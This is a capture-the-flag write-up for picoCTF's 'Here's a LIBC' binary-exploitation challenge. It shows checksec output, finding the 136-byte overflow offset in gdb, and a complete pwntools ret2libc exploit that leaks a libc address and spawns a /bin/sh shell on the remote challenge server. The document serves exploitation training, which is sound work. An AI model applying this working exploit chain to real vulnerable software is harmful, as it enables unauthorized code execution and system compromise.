### Here's a LIBC

Download the files and run `./vuln`.

```bash
➜  Here's a LIBC git:(main) ✗ chmod + * && ./vuln 
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
```

To fix it, we run `patchelf`.

```bash
patchelf --set-rpath ./libc.so.6 ./vuln
```

```bash
➜  Here's a LIBC git:(main) ✗ ./vuln 
WeLcOmE To mY EcHo sErVeR!
```

#### Protections 🛡️

Run `checksec` inside `gdb`.

```bash
gef➤  checksec
[+] checksec for '/home/w3th4nds/github/Pico-CTF-Practice/Binary-Exploitation/Here's a LIBC/vuln'
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

| Protection | Enabled     | Usage                                         |
| :--------- | :---------- | :-------------------------------------------- |
| **Canary** | ❌           | Prevents **Buffer Overflows**                 |
| **NX**     | ✅           | Disables **code execution** on stack          |
| **PIE**    | ❌           | Randomizes the **base address** of the binary |
| **RelRO**  | **Partial** | Makes some binary sections **read-only**      |

Fuzzing the program a bit, we find that it's vulnerable to buffer overflow because after some "A"s, a `Segmentation Fault` occurs.

```bash
➜  Here's a LIBC git:(main) ✗ ./vuln
WeLcOmE To mY EcHo sErVeR!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaaaaaaaaaaaaaaaaaaaaad
[1]    4945 segmentation fault (core dumped)  ./vuln
```

We have the `libc`, `PIE` and `Canary` are disabled, so we can easily perform a `ret2libc` attack.

What we need to do:

- Find the overflow offset to overwrite the return address.
- Call `puts(puts@GOT)` to leak a libc address and calculate libc base.
- Redirect to `main()` again to trigger another buffer overflow.
- Call `system("/bin/sh");` now that we know `libc base`.

To find the offset we create a pattern inside `gdb` and then run the program.

```bash
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
```

```gdb
0x007fffffffdd98│+0x0000: "raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"	 ← $rsp
0x007fffffffdda0│+0x0008: "saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaaya[...]"
0x007fffffffdda8│+0x0010: "taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"
0x007fffffffddb0│+0x0018: "uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"
0x007fffffffddb8│+0x0020: "vaaaaaaawaaaaaaaxaaaaaaayaaaaaaa"
0x007fffffffddc0│+0x0028: "waaaaaaaxaaaaaaayaaaaaaa"
0x007fffffffddc8│+0x0030: "xaaaaaaayaaaaaaa"
0x007fffffffddd0│+0x0038: "yaaaaaaa"
───────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400769 <do_stuff+145>   call   0x400540 <puts@plt>
     0x40076e <do_stuff+150>   nop    
     0x40076f <do_stuff+151>   leave  
 →   0x400770 <do_stuff+152>   ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x400770 in do_stuff (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400770 → do_stuff()
──────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset raaaaaaasaaaaaaataaa
[+] Searching for 'raaaaaaasaaaaaaataaa'
[+] Found at offset 136 (big-endian search)
```

We found the offset at `136` bytes.

Now the first payload to leak should look like this:

```python
e      = ELF(fname)
rop    = ROP(e)

# Craft payload to leak puts@GOT and return to main()
rop.call('puts', [e.got.puts])

payload = flat({
  0x88: rop.chain() + p64(e.sym.main)
 })

r.sendline(payload)
r.recvlines(2)
print(r.recvline())
```

```bash
➜  Here's a LIBC git:(main) ✗ python solver.py
[+] Starting local process './vuln': pid 9054
[*] "/home/w3th4nds/github/Pico-CTF-Practice/Binary-Exploitation/Here's a LIBC/vuln"
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'./libc.so.6'
[*] "/home/w3th4nds/github/Pico-CTF-Practice/Binary-Exploitation/Here's a LIBC/libc.so.6"
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 14 cached gadgets for './vuln'
b'\xd0\x0e\xe8\xe3\x84\x7f\n'
[*] Stopped process './vuln' (pid 9054)
```

We managed to leak a `libc address`. Now we calculate `libc base` and call `system("/bin/sh");`.

The final payload should look like this:

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.arch = 'amd64'

fname = './vuln' 

LOCAL = False

if LOCAL:
  r    = process(fname)
  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
  r    = remote('mercury.picoctf.net', 37289)
  libc = ELF('./libc.so.6')

e      = ELF(fname)
rop    = ROP(e)

# ret2libc leak
rop.call('puts', [e.got.puts])

payload = flat({
  0x88: rop.chain() + p64(e.sym.do_stuff)
 })

r.sendline(payload)

libc.address = u64(r.recvline_contains('\x7f').strip().ljust(8, b'\x00')) - libc.sym.puts
success(f'Libc base: {libc.address:#04x}')

# ret2libc
rop = ROP(libc, base=libc.address)
rop.call(rop.ret[0])
rop.system(next(libc.search(b'/bin/sh\x00')))

payload = flat({
  0x88: rop.chain()
 })

r.sendline(payload)

r.interactive()
```

```bash
➜  Here's a LIBC git:(main) ✗ python solver.py
[+] Opening connection to mercury.picoctf.net on port 37289: Done
[*] "/home/w3th4nds/github/Pico-CTF-Practice/Binary-Exploitation/Here's a LIBC/libc.so.6"
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] "/home/w3th4nds/github/Pico-CTF-Practice/Binary-Exploitation/Here's a LIBC/vuln"
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'./libc.so.6'
[*] Loaded 14 cached gadgets for './vuln'
[+] Libc base: 0x7fccd29bd000
[*] Loaded 198 cached gadgets for './libc.so.6'
[*] Switching to interactive mode
AaAaBaAaCaAaDaAaEaAaFaAaGaAaHaAaIaAaJaAaKaAaLaAaMaAaNaAaOaAaPaAaQaAaRaAaSaAaTaAaUaAaVaAaWaAaXaAaYaAazaabbaabcaabdaabeaabd
$ ls
flag.txt
libc.so.6
vuln
vuln.c
xinet_startup.sh
```



